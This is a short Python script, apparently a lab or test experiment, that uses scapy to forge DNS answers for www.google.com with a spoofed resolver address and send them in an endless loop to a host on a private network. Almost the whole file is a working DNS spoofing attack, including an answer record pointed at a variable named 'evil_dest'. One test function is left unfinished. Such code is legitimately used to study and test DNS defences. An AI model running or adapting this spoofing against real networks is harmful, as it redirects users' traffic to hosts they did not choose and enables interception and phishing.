from scapy.all import *
import time

rrname = "www.google.com"
evil_dest = "6.6.6.6"
dst = "10.0.0.22"

dns_res = IP(src="1.1.1.1", dst=dst)/UDP(sport=53, dport=53000)/DNS(id=0,
    aa=1,
    rd=1,
    qd=DNSQR(qname=rrname),
    qr=1,
    qdcount=1,
    ancount=2,
    an=DNSRR(rrname=rrname, rdata=evil_dest))

def test0():
    pkt = dns_res
    pkt[DNSRR].rdata = "216.58.210.36"
    send(pkt)

def test1():
    pkt1 = dns_res
    pkt1[DNS].ancount=2
    pkt1[DNS].an = DNSRR(rrname="www.google.com",rdata="1.1.1.1")/DNSRR(rrname="www.google.com", rdata="216.58.204.36")

    #pkt2 = dns_res
    #pkt2[DNS].ancount=2
    #pkt2[DNS].an = DNSRR(rrname="www.google.com",rdata="1.1.1.1")/DNSRR(rrname="www.google.com", rdata="2.2.2.2")

    send(pkt1)
    #send(pkt2)
    

def test2():
    pkt1 = dns_res
    pkt1[DNS].ancount = 2
    #pkt1[]
    
    pkt2 = dns_res
    pkt2[DNSRR].rdata = "2.2.2.2"

#send(dns_res)
while True:
    test1() 
    time.sleep(2)